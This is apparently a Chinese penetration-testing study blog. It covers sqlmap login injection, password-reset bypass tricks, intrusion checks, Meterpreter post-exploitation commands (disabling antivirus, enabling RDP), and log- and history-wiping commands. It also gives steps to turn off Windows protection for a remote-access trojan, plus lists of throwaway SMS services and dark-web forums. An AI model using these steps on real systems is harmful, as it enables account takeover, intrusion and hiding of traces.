一般性刚碰到后台登录界面的时候，一般都是先用万能密码什么的测试一下输入框有没有注入（现在很少见了）。如果没有，就先拿admin，123456等测试一下弱口令，不一定要求立马就能得到密码。在这里关键是看下回显，查看是否存在账号锁定策略，密码不正确，不存在此用户名等信息，以便于尝试可能存在的用户名。没验证码就上爆破工具，有验证码的话看看能不能绕过，实在不行手工测几个账号密码碰碰运气。


### 登录框

Xss Xss+Csrf
修改返回包信息，登入他人账户
修改cookie中的参数，如user,admin,id等
干货 | 登录点测试的Tips

POST注入：
（1）目标地址http:// http://www.xxx.com /login.asp
（2）打开burp代理
（3）点击表单提交
（4）burp获取拦截信息（post）
（5）右键保存文件（.txt）到指定目录下
（6）运行sqlmap并执行如下命令：
用例：sqlmap -r okay.txt -p username
// -r表示加载文件(及步骤（5）保存的路径)
-p指定参数（即拦截的post请求中表单提交的用户名或密码等name参数）
（7）自动获取表单：--forms自动获取表单
例如：sqlmap -u http://www.xx.com/login.asp --forms
（8）指定参数搜索：--data
例如:sqlmap -u http://www.xx.com/login.asp --data "username=1"

常用指令：

--purge 【重新扫描（--purge 删除原先对该目标扫描的记录）

--tables 【获取表名

--dbs 【检测站点包含哪些数据库

--current-db 【获取当前的数据库名

--current-user 【检测当前用户

--is-dba 【判断站点的当前用户是否为数据库管理员

--batch 【默认确认，不询问你是否输入

--search 【后面跟参数 -D -T -C 搜索列（C），表（T）和或数据库名称（D）

--threads 10 【线程，sqlmap线程最高设置为10
--level 3 【sqlmap默认测试所有的GET和POST参数，当--level的值大于等于2的时候也会测试HTTP Cookie头
的值，
当大于等于3的时候也会测试User-Agent和HTTP Referer头的值。最高为5
--risk 3 【执行测试的风险（0-3，默认为1）risk越高，越慢但是越安全
-v 【详细的等级(0-6)
0：只显示Python的回溯，错误和关键消息。
1：显示信息和警告消息。
2：显示调试消息。
3：有效载荷注入。
4：显示HTTP请求。
5：显示HTTP响应头。
6：显示HTTP响应页面的内容

--privileges 【查看权限


--method "POST" --data "page=1&id=2" 【POST方式提交数据

--threads number　　【采用多线程 后接线程数

--referer "" 【使用referer欺骗


--proxy “目标地址″ 【使用代理注入

sqlmap常用路径：

添加表字段的目录在/usr/share/sqlmap/txt/common-tables.txt

存放扫描记录的目录在/root/.sqlmap/output


### 密码修改

例如：
phone=18888888888abc
国内很多情况下都没有过滤字符和限制输出长度，验证很有可能只是简单的处理
只要更换手机号后面的字符，就可以绕过请求过于频繁的限制
但是校验时，手机号后面的字符会被过滤，也就是可以利用暴力破解验证码（不计入次数）
所以只要在暴力破解的同时，改变手机号后面的字符即可达到漏洞效果

根据手机号找回密码，但是验证次数被限制，抓包
可以尝试在手机号后面添加不为数字的字符，查看是否过滤
根据手机号找回密码，随便输个验证码，抓包
暴力破解验证码（假如只有四位），很快就可以破解出来
四位或六位纯数字，验证码次数未限制
例如：
如果验证码次数限制，破解一会就会提示请求过于频繁，这时就需要绕过限制
例如：
通过密保问题找回密码，查看源码，密保问题和答案就在源码中显示

任意密码重置概要：
1．重置一个账户，不发送验证码，设置验证码为空发送请求。
2．发送验证码，查看相应包
3．验证码生存期的爆破
4．修改相应包为成功的相应包
5．手工直接跳转到校验成功的界面
6．两个账户，重置别人密码时，替换验证码为自己正确的验证码
7．重置别人密码时，替换为自己的手机号
8．重置自己的成功时，同意浏览器重置别人的，不发验证码
9．替换用户名，ID，cookie，token参数等验证身份的参数
10．通过越权修改他人的找回信息如手机/邮箱来重置

### 用户注册

### 发送邮件/电话号码短信

比如在修改密码或者做验证时，这将会有发送的情况

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210518205555518.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)


登陆口，第一件事肯定是看返回的信息了。
在我们通过对目标的前期信息收集之后，首当其冲的往往就是各种奇奇怪怪的登录框，一般来说，大型的企业为了减少安全问题，一般都是用统一的登录接口登录不同的旗下网站，但是一些后台系统，运维系统，或者一些边缘业务使用了独立的注册、登录体系，这个时候往往就会存在安全问题。




### windows 入侵检查

查看服务器是否有弱口令，远程管理端口是否对公网开放。
查看服务器是否存在可疑账号、新增账号。
查看服务器是否存在隐藏账号、克隆账号。
检查异常端口、进程
检查服务器是否有异常的启动项。
查看系统版本以及补丁信息
查找可疑目录及文件
病毒查杀
webshell查杀
日志分析

### linux 入侵检查

1、查询特权用户特权用户(uid 为0)
[root@localhost ~]# awk -F: '$3==0{print $1}' /etc/passwd
2、查询可以远程登录的帐号信息
[root@localhost ~]# awk '/\$1|\$6/{print $1}' /etc/shadow
3、除root帐号外，其他帐号是否存在sudo权限。如非管理需要，普通帐号应删除sudo权限
[root@localhost ~]# more /etc/sudoers | grep -v "^#\|^$" | grep "ALL=(ALL)"
4、禁用或删除多余及可疑的帐号

通过 .bash_history 文件查看帐号执行过的系统命令
使用 netstat 网络连接命令，分析可疑端口、IP、PID
使用 ps 命令，分析进程

1、查看敏感目录，如/tmp目录下的文件，同时注意隐藏文件夹，以“..”为名的文件夹具有隐藏属性

2、得到发现WEBSHELL、远控木马的创建时间，如何找出同一时间范围内创建的文件？

	可以使用find命令来查找，如  find /opt -iname "*" -atime 1 -type f 找出 /opt 下一天前访问过的文件

3、针对可疑文件可以使用 stat 进行创建修改时间。

### 如何发现隐藏的 Webshell 后门

**手工**
最好的方式就是做文件完整性验证。通过与原始代码对比，可以快速发现文件是否被篡改以及被篡改的位置。当然，第一个前提是，你所在的团队已具备代码版本管理的能力，如果你是个人站长，相信你已经备份了原始代码。
**1、文件 MD5 校验**
**2、diff 命令**
**3、版本控制工具**
**4、文件对比工具**
关键词：代码对比工具，你会找到很多好用的工具，这里我们推荐两款效果还不错的工具，Beyond Compare 和 WinMerge。


## 待补充：后门

后门是个笼统的说法，有网页端有软件端，

### 后门中的后门
以下这个shell箱子是公开程序。现实中，你在使用网上别人的后门工具去入侵别人时候，一般这个后门软件都加上了后门，且程序加密。当你利用他的软件入侵成功，入侵成功的账号密码将会发送到开发后门软件的人服务器上。如果你想反客为主，就用xss去盗取cookie吧。

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210710005549617.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)![在这里插入图片描述](https://img-blog.csdnimg.cn/2021071011142680.png)
查看一个软件有没有后门，可以直接抓包，但也不乏有一些高端玩家，你无法直接从包里看出对方在干啥。比如下图在调用后门软件就有将你攻破成功后目标网站信息等。
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210710124740614.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
### 后门软件

#### 远程控制

##### Quasar

下载地址 https://github.com/quasar/Quasar/releases
下载前先将win10保护暂时关闭，否则你的程序将会被误杀。
打开设置>>更新和安全>>windows安全中心>>病毒和威胁防护>>病毒和威胁防护设置（管理设置）>>关闭实时保护
如果你使用火绒浏览器，即便你打开了quasar，也很可能无效。
具体使用地址参考https://blog.csdn.net/qq_44930903/article/details/111600982
# 待补充，可能不要这一小节：技巧
## HTTP 参数污染

**什么是**
[参考链接](https://www.codenong.com/cs105293023/)
这是直接修改参数的另一种思路，对于链接直接修改参数很可能失败，那么我们尝试将参数补充上呢？
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210425233145741.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
**简介**
难度：低
通常用在：分享链接
拓展思路：对客户端的攻击，比如投票、跳转、关注等；
绕过安全防护软件；


**实战**

测试链接：
模板引擎攻击——模板注入

# 隐藏技术

阻止防御者信息搜集，销毁行程记录，隐藏存留文件。

## 实用工具

### 匿名工具
**手机**
下面是一些免费的接码平台，可以收取短信验证码

国际接码，不过中国的也很多 https://yunjisms.xyz/

大多是其他国家的手机号，你注册有的网站可能无法识别此号码https://www.bfkdim.com/
https://jiemahao.com
http://zg.114sim.com/


http://114sim.com/

https://yunduanxin.net/
http://z-sms.com/
https://zusms.com

www.kakasms.com
www.materialtools.com
www.suiyongsuiqi.com
mianfeijiema.com
www.114sim.com
yunduanxin.net
www.shejiinn.com
www.zusms.com


**邮箱**
好用 https://www.moakt.com/zh
https://temp-mail.org/zh/
https://www.guerrillamail.com/zh/
http://links.icamtech.com/

匿名后机会

VPS

纯净无线设备

纯净移动设备


## 免杀

https://payloads.online/archivers/2020-02-05/1
远控免杀的认知还大约停留在ASPack、UPX加壳、特征码定位及修改免杀的年代。近两年随着hw和红蓝对抗的增多，接触到的提权、内网渗透、域渗透也越来越多。攻击能力有没有提升不知道，但防护水平明显感觉提升了一大截，先不说防护人员的技术水平如果，最起码各种云WAF、防火墙、隔离设备部署的多了，服务器上也经常能见到安装了杀软、软waf、agent等等，特别是某数字杀软在国内服务器上尤为普及。这个时候，不会点免杀技术就非常吃亏了。
在免杀方面任晓辉编著了一本非常专业的书《黑客免杀攻防》，感兴趣的可以看一下。

## 持久化

### 防止掉入蜜罐

匿名者需要额外小心，很多时候一不小心点了红队传送的URL，那么我们就很可能被JSONP蜜罐直接获取社交号或者被抓到真实的出口IP

**识别蜜罐**

**欺骗蜜罐**

当我们识别出蜜罐，有以下方式来做反攻：

>①投喂大量脏数据
>
>②伪造反向蜜罐，诱导红队进入并误导溯源并消耗红队的精力



## 匿名代理纯净的渗透环境

http://www.webscan.cc/ C端同服扫描



http://www.yunsee.cn/ 云悉WEB资产搜集


http://haoma.sogou.com/rz/ 搜狗号码通

http://haoma.baidu.com/query 百度号码认证

http://www.gogoqq.com/ 非好友情况如何查看QQ空间


http://whitepages.com 房产登记信息查询

http://www.webscan.cc/ 在线工具






###  日志删除

攻击和入侵很难完全删除痕迹，没有日志记录也是一种特征
即使删除本地日志，在网络设备、安全设备、集中化日志系统中仍有记录
留存的后门包含攻击者的信息
使用的代理或跳板可能会被反向入侵
**windows**
操作日志：3389登录列表、文件访问日志、浏览器日志、系统事件
登录日志：系统安全日志
**linux**
清除历史
unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG; export HISTFILE=/dev/null;
kill -9 $$ kill history
history -c
删除 ~/.ssh/known_hosts 中记录
修改文件时间戳
touch –r
删除tmp目录临时文件

### 使用tor网络


### 将流量隐藏于合法流量中

### 修改来源于类型

### 获得 Shell后

以下命令是使用metapreter

#### 进程迁移

我们要选择一个稳定的进程将病毒绑在一起。
使用ps查看当前运行的进程找出稳定的pid比如是113，getpid查看病毒进程号。
输入

```bash
migrate 113
```

#### 系统命令

```bash
# 收集系统信息
sysinfo

#检查命令是否运行在
run post/windowns/gather/checkvm

# 查看目标机是否在运行，最近在运行的时间
idletime

# 关闭目标机的杀毒软件
run post/windows/manage/killav

# 启动3389端口
run post/windows/manage/enable_rdp

# 
```



# 下一步

国内网络安全技术与国外是不同步的，比如SQL注入在02年已经在国外能看到很多博客了，在国内还是风平浪静。因而这里就相当于有一片适合我们安全客的天地。查看国内外知名的APT攻击，他们往往代表着最领先的黑客攻击技术，相当有价值！

身为安全工程师，你应该寻找最新动向。如果你感兴趣以下自学网站，你应该写一个代码，去每天自动推送到你的微信。
**待补充技能：爬虫+渗透**

## 自学


### 文档

文档较全 https://websec.readthedocs.io/zh/latest/language/python/unserialize.html
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210627215558439.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)


有部分有用文档 http://www.xiaodi8.com/?page=2
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210627215524558.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

### 视频
**小迪安全**
推荐指数：5
适合人群：初学者偏上，中级偏下。
预备技能：一点编程、基础安全知识
整体评价：干货多
[视频很推荐B站小迪8 课程从2020/5/20开始](https://www.bilibili.com/video/BV1JZ4y1c7ro?p=4&spm_id_from=pageDriver)
小迪安全视频笔记（7/8才更新到38集左右。）https://www.yuque.com/gemaxianrenhm/hahwdw/rko38g

暗月安全培训（听说不错，看完小迪再看）
## 如何赚钱

具备白帽子渗透证书(CISSP，CISA，NISP)优先

发证机构：(ISC)2 国际信息系统安全认证协会(Internationa Information Systems Security Cerification Consortium)

考证要求：需要工作经验

考取难度：★★★★☆（比CISP难度多一星因为英语和6小时的考试时间，比较摧残人）

适应类型：外企、涉外服务、大型企业（包括国有企业，有不少国企也比较认CISSP）如银行等信息安全主管和信息安全从业者。费用： 培训不强制，国内很多培训公司都提供，无需培训也可直接考试。考试费599美元。(这是一次考试的费用，如果没通过，下次还要交考试费)

认证说明：CISSP因为推出比较早，所以相对比较知名，(ISC)2 一共推出了9项认证，所以我们在这谈CISSP认证包含了是由CISSP延伸出来的系列认证。分别如下：

(ISC) 注册信息系统安全师（CISSP）
(ISC) 注册软件生命周期安全师（CSSLP）
(ISC) 注册网络取证师（CCFPSM）
(ISC) 注册信息安全许可师（CAP）
(ISC) 注册系统安全员（SSCP）
(ISC) 医疗信息与隐私安全员 (HCISPPSM)

CISSP 专项加强认证:CISSP-ISSAP (Information Systems Security Architecture Professional) 信息系统安全架构专家CISSP-ISSEP（Information Systems Security Engineering Professional）信息系统安全工程专家CISSP-ISSMP（Information System Security Management Professional）信息系统安全管理专家

目前认证中也就CISSP因为资格老，比较多人知道，所以考的较多，其他的嘛，屈指可数。

### 当老师

国外的教学视频，语言更简洁，原创性更高，ppt还是动画版的，十分扼要；但国内ppt做得十分循规蹈矩

学会如何表达自己，如何使用正确手势，如何使用正确讲课音调

视频剪辑

给视频加字幕方法https://www.iculture.cc/knowledge/pig=168
**发博客赚钱**
搭建个人博客 https://zhuanlan.zhihu.com/p/102592286
**售卖网课**
**售卖电子书**
售卖国外电子书，这个网站有大量免费国外电子书网站链接 https://freeditorial.com/
**src平台**

**接外包**


## 刷题

cisp-pte考证

[封神台-掌控安全学院公开靶场](https://hack.zkaq.cn/?a=battle "封神台-掌控安全学院公开靶场")
实验吧，和bugkuCTF题目要简单一点https://ctf.bugku.com/，适合初学者做
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210628215050142.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

![在这里插入图片描述](https://img-blog.csdnimg.cn/2021050919362733.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

## 工具社区

https://www.cnvd.org.cn/

https://www.securityfocus.com/

https://packetstormsecurity.com/

https://www.exploit-db.com/

https://cxsecurity.com/

https://shuimugan.com/

http://0day.today/
360威胁情报中心

开放漏洞情报：
CVE
Expolit-DB
CX security
CNVD
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210521222907174.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210521223000126.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210521223046475.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210521223153221.png)

securitytracker

很不错的社会工程学资源，而且更新也很及时 http://www.20045018.com/
![在这里插入图片描述](https://img-blog.csdnimg.cn/2021070118385397.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)


## 知名机构

穷奇、海莲花这两个APT组织的攻击活动

## 社区

https://www.reddit.com/r/websecurityresearch/
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210701223121553.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

https://www.reddit.com/r/websecurityresearch/
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210701223216598.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
https://twitter.com/albinowax

国际信息系统安全协会这个协作性专业网络通过培训计划、研讨会和职业服务将全球的网络安全专业人员联合起来。ISSA 还为雄心勃勃的专业人士开设了一个研究员计划。
(ISC) 2这家领先的非营利网络安全组织拥有超过 150,000 名专业人士的会员基础。它提供受人尊敬的认证、考试准备资源、职业服务和许多其他福利。
ISACA这个面向企业的组织提供的福利包括仅限会员的招聘会和招聘委员会、国际会议以及 200 多个举办培训研讨会和活动的当地分会。ISACA 提供学生、应届毕业生和专业会员级别。
Comp-TIA另一个受人尊敬的全球网络安全领导者，Comp-TIA 组织提供专业培训计划、继续教育和认证。会员还可以使用专属的职业中心。


一些高质量的免费黑客课程，不过上一次更新是一年前了。http://www.securitytube.net/listing?type=latest&page=2
免费观看 udemy 付费课程 https://freetutorialsudemy.com

很不错的个人博客，为数不多推荐的个人博客，写得很详细，也很全，含黑客的常用技巧https://www.hackingarticles.in

https://www.classcentral.com/subject/cybersecurity?free=true
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210624142258642.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

1. IT 和网络安全简介
   由Cybrary IT 提供


这个免费的 IT 和网络安全培训课程时长 4 小时 21 分钟，非常适合初学者。培训通过关注 IT 和网络安全的四个学科向学生介绍该行业：

• 系统管理

• 网络工程

• 事件响应和取证

• 攻击性安全和渗透测试

该课程由 Cybrary 的主教练 Ken Underhill 和 FireEye 的高级技术教练 Joe Perry 监督。这些行业专家提供了我们列表中最好的免费在线网络安全课程之一，该课程专门用于帮助那些持观望态度的人决定适合他们的职业道路。学生将发现 Cybrary 平台使用引人入胜的点播视频以合乎逻辑的、用户友好的顺序发展。

费用：免费

证书：是

完成时间： 4小时21分钟

课程：介绍

用户体验：优秀

教学质量：优秀

优点：

•提供证书

•简短而引人入胜

•深入了解该领域每条职业道路的细节

缺点：

•学生必须创建一个帐户才能访问材料

### 黑客组织和官网

thc,开发了hydra等 https://www.thc.org/

**Hack Forums:**
http://hackforums.net/

>**Hack Forums** 是目前最为理想的黑客技术学习根据地。该论坛不仅在设计上面向黑客群体，同时也适用于开发人员、博主、游戏开发者、程序员、图形设计师以及网络营销人士。
>2021/5/22访问显示Site Offline；Access denied


https://null-byte.wonderhowto.com

Hackaday

http://hackaday.com/

Hackaday是排名最高的网站之一，提供黑客新闻和各种黑客和网络教程。它还每天发布几篇最新文章，详细描述硬件和软件黑客，以便初学者和黑客了解它。Hackaday还有一个YouTube频道，用于发布项目和操作视频。它为用户提供混合内容，如硬件黑客，信号，计算机网络等。该网站不仅对黑客有用，而且对数字取证和安全研究领域的人也有帮助。


Hackaday

http://hackaday.com/

Hackaday是排名最高的网站之一，提供黑客新闻和各种黑客和网络教程。它还每天发布几篇最新文章，详细描述硬件和软件黑客，以便初学者和黑客了解它。Hackaday还有一个YouTube频道，用于发布项目和操作视频。它为用户提供混合内容，如硬件黑客，信号，计算机网络等。该网站不仅对黑客有用，而且对数字取证和安全研究领域的人也有帮助。



邪恶论坛

https://evilzone.org/

这个黑客论坛可以让你看到关于黑客攻击和破解的讨论。但是，您需要成为此站点上的成员才能查看有关道德黑客攻击的查询和答案。您需要做的就是注册以获取您的ID以获得您的查询答案。您的查询解决方案将由专业黑客回答。记住不要问简单的黑客技巧，这里的社区人非常认真。

HackThisSite

https://www.hackthissite.org/

通常被称为HTS，是一个在线黑客和安全网站，为您提供黑客新闻和黑客教程。它旨在通过一系列挑战，在安全和合法的环境中为用户提供学习和练习基本和高级“黑客”技能的方法。


http://breakthesecurity.cysecurity.org/

该网站的动机以其名称解释。Break The Security提供各种黑客攻击，如黑客新闻，黑客攻击和黑客教程。它还有不同类型的有用课程，可以让你成为一名认证黑客。如果您希望选择黑客和破解的安全性和领域，此站点非常有用。

EC理事会 - CEH道德黑客课程

https://www.eccouncil.org/Certification/certified-ethical-hacker

国际电子商务顾问委员会（EC-Council）是一个由会员支持的专业组织。EC理事会主要作为专业认证机构而闻名。其最着名的认证是认证道德黑客。CEH代表综合道德黑客，提供完整的道德黑客攻击和网络安全培训课程，以学习白帽黑客攻击。你只需要选择黑客课程包并加入训练，成为一名职业道德黑客。本网站可以帮助您获得各种课程，使您成为经过认证的道德黑客。


http://www.hitb.org/

这是一个受欢迎的网站，提供黑客地下的安全新闻和活动。您可以获得有关Microsoft，Apple，Linux，编程等的大量黑客文章。该网站还有一个论坛社区，允许用户讨论黑客技巧。

SecTools

http://sectools.org/

顾名思义，SecTools意味着安全工具。该网站致力于提供有关网络安全的重要技巧，您可以学习如何应对网络安全威胁。它还提供安全工具及其详细说明。


Offensive Community:

http://offensivecommunity.net/

Offensive安全社区基本上属于一个“具备大量黑客教程收集库的黑客论坛”。


Hellbound Hackers:

https://www.hellboundhackers.org/forum/

这里提供与黑客技术相关的各类课程、挑战题目与实现工具。


Hack This Site:

https://www.hackthissite.org/forums/

HackThisSite提供合法而安全的网络安全资源，在这里大家可以通过各类挑战题目测试自己的黑客技能，同时学习到更多与黑客及网络安全相关的知识。简而言之，这是学习黑客技术的最佳站点。


Hack Hound:

http://hackhound.org/forums/

一个拥有大量相关教程及工具的黑客论坛。


Binary Revolution Hacking Forums:

http://www.binrev.com/forums/

提供各类教程、工具以及安全文章。


Exploit-DB:

https://www.exploit-db.com/

Exploit-DB提供一整套庞大的归档体系，其中涵盖了各类公开的攻击事件、漏洞报告、安全文章以及技术教程等资源。


Crackmes:

http://www.crackmes.de/

在这里，大家可以通过解决各类任务（即crackmes）来测试并提升自己的相关技能水平。


Cracking Forum:

http://www.crackingforum.com/

提供各类最新入侵教程及工具。


Ethical Hacker:

http://www.crackingforum.com/

另一个黑客论坛，提供多种教程及工具资源。


Rohitab:

http://www.rohitab.com/discuss/

Rohitab专注于安全类文章、计算机编程、Web设计以及图形设计等领域。


Enigma Group:

http://www.enigmagroup.org/

Enigma Group提供合法且安全的安全资源，大家可以在这里通过各类培训任务测试并拓展自己的技能水平。


Hack Mac:

http://www.hackmac.org/forum/

提供与Mac平台相关的黑客、入侵以及安全保护教程。


OpenSC:

https://www.opensc.ws/forum.php

Open SC是一个安全研究与开发论坛，且号称是全球知名度最高的恶意软件论坛。


Packet Storm:

https://packetstormsecurity.com/








根据安全公司和网络专家， hackforum，Trojanforge，Mazafaka，dark0de和TheRealDeal进行的几项调查报告，深度网络中的Hacking社区数量非常高。

大多数黑客社区都对公众不开放，因此必须要求邀请才能加入讨论。

在只能通过邀请访问的社区中，有几个黑客论坛，例如流行的Trojanforge，它专门研究恶意软件和代码反转。

这些社区只是不给您需要的第二个人提供会员资格，以向他们表明您对黑客和相关知识有所了解，能够证明自己的价值。 在论坛上，您可以直接听到世界主要黑客组织的声音。目前最好的黑客组织是什么？
匿名论坛http://rhe4faeuhjs4ldc5.onion/。 黑客技巧和聊天，无需注册
0day论坛http://qzbkwswfv5k2oj5d.onion/。 黑客，安全服务教程，需要注册
Ahima http://msydqstlz2kzerdg.onion/。 阅读隐藏和有趣的新闻。
Anarplex http://y5fmhyqdr6r7ddws.onion/。 密码服务和密码破解
Hydra http://hydraf53r77hxxft.onion/一个论坛，您可以在该论坛上讨论有关Darknet的任何主题
NetFlix帐户http://netflixyummrhppw.onion/，他们出售被黑的Netflix帐户。您将需要比特币进行交易。
确保 访问深度网络 是非法的，因此请 务必采取必要的措施 。
[FreeBuf，適合初學者，在這裏可以看到搬运的优质资源](https://www.freebuf.com/articles/)
[安全客，每篇文章的审核都很严格，因而社区质量高](https://www.anquanke.com/post/id/235970)

[书栈网，有免费github原创中文电子书可搜](https://www.bookstack.cn/search/result?wd=%E6%B8%97%E9%80%8F)

[高质量渗透交流活跃社区](http://www.91ri.org/)

[sec_wiki查看一些当下会议总结，更新还算及时](https://www.sec-wiki.com/index.php)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210510030811163.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

2014年成立，更新频繁。文章浅显而广。https://www.heibai.org/

[质量高，但更新也不快，文章来源于站长的爬虫](https://www.moonsec.com/)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210510040438393.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

## 期刊

**停更**
https://gitee.com/litengfeiyouxiu_admin/Safety-Magazine
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210505233058247.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)


## 大会

比较有影响力的演习有“锁盾”（Locked Shields）、“网络风暴”等。其中“锁盾”由北约卓越网络防御合作中心（CCDCOE，Cooperative Cyber Defence Centre of Excellence）每年举办一次。“网络风暴”由美国国土安全部（DHS）主导，2006年开始，每两年举行一次。

和APT攻击相比，攻防演习相对时长较短，只有1~4周，有个防守目标。而APT攻击目标唯一，时长可达数月至数年，更有隐蔽性。

 Black Hat USA
defcon [Defcon的CTF“世界杯” 是全球最顶级的网络技术攻防竞赛。](https://www.defcon.org/)
OWASP亚洲峰会

## 导航

其实各位大可不必一个个收藏知名网络安全学习的链接或工具，由于黑客覆盖面广大多，有很多更新较为及时的导航链接已经为你做好了大部分寻找资源的工作。
[纳威安全导航](https://navisec.it/)![在这里插入图片描述](https://img-blog.csdnimg.cn/20210509182041213.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

## 大佬博客

推荐的这些大佬博客值得关注
**国内**
https://blog.csdn.net/qq_29277155

## 赏金平台/SRC

SRC
**经验**
在挖漏洞一定要写清楚细节，对于中高危最好录个像。
刷众测平台，这一般要在补天或者漏洞盒子上拿到排名才有机会参加。

佛系挖：挖SRC需要有一个好心态，国内SRC生态并不是很好，SRC感觉更多的提供了一个相对安全的测试保障，所以更需要抱着一种学习的心态去挖，将我们学习的到的知识灵活运用，发现新的问题。不要想我今晚一定要挖到多少漏洞，要拿到多少奖金，不然可能会被忽略三连打崩心态。
**链接**
[女娲补天](https://nvwa.org/index_zh.php)
[漏洞盒子](https://www.vulbox.com/projects/list)
CNVD
教育行业漏洞报告平台
补天漏洞响应平台：https://butian.360.cn/
漏洞银行：https://www.bugbank.cn/
阿里云漏洞响应平台：https://security.alibaba.com/
i春秋SRC部落：https://www.ichunqiu.com/src
腾讯应急响应中心：https://security.tencent.com/index.php
搜狗安全应急响应平台（http://www.0xsafe.com/#SGSRC）
[hackerone](https://www.hackerone.com/ "hackerone")
[bugcrowd](https://www.bugcrowd.com/ "bugcrowd")
https://www.synack.com/
https://cobalt.io/
国外比较常见的漏洞赏金平台是 HackerOne，BugCrowd 和 SynAck。还有很多其他的平台。这些平台可以支付从零到两万美元以上之间的奖励。



## 图书推荐

Web之困

白帽子讲浏览器安全(钱文祥)
Web前端黑客技术揭秘
XSS跨站脚本攻击剖析与防御
SQL注入攻击与防御

![在这里插入图片描述](https://img-blog.csdnimg.cn/2021050918031945.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210509180409778.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

《黑客大揭秘：近源渗透测试》

《内网安全防范：渗透测试实战指南》
整理整理了2019 年国外卖得火热的黑客书籍，下面列出了一个清单。（再也不愁不知道送什么礼物了~）

排名不分先后。源自：Mejores libros de Hacking 2019-2020: Principiante a Avanzado
01：Kali Linux Revealed: Mastering the Penetration Testing Distribution（难易度：★★☆☆☆）
这是一本有关 Kali Linux 的黑客书籍。Kali Linux（以前称为 Backtrack）是可用的最受欢迎的渗透测试发行版。因此，很有必要学习它。尽管不建议初学者使用 Kali Linux，但是如果想使用 Kali Linux，还是建议阅读。

